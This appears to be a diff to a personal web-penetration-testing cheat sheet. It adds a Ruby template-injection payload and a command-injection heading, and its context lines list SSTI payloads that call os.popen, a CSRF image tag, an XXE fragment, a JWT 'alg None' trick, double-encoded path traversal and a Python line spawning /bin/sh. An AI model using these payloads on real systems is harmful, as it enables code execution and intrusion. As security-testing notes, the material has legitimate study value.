@@ -39,6 +39,8 @@ toc_sticky: true
     <li>xxs?</li>
     <li>WIP</li>
     <li>SSRF</li>
+    <li>phpmailer</li>
+    <li>ruby - render -inline <%= `id %></li>
     <li>Server-side template injection - {{''.__class__.mro()[1].__subclasses__()[X](COMMAND)}} or {{url_for.__globals__.os.popen("id").read() }} or TPLMAP.py</li>
     <li>CSRF - <.img src="https://vulnerable-website/email/change?email=pwned@evil-user.net"> or tool=xsrfprobe</li>
     <li>xml entities - <!DOCTYP3 test [
@@ -69,6 +71,8 @@ toc_sticky: true
 <h2>JWT</h2>
 <p>header.data.signature - all in base64</p>
 <p>set alg to None - remove signature </p>
+
+
 
 <h2>apache and tomcat</h2>
 <p>encoding of .. = %252e%252e</p>
@@ -145,7 +149,7 @@ toc_sticky: true
  => true
 > Base64.decode64(URI.decode("OR9hcp18%2BC1bChK10NlRRg%3d%3d"))
  => "9\x1Far\x9D|\xF8-[\n\x12\xB5\xD0\xD9QF"
-    
+  </pre></code>
 
 </fieldset>
 
@@ -156,3 +160,7 @@ asd__import__('os').system('/bin/sh')asd
 
 
 <h2>.git - dump</h2>
+
+<h2>command injection</h2>
+<p>what to look for</p>
+<li>app</li>
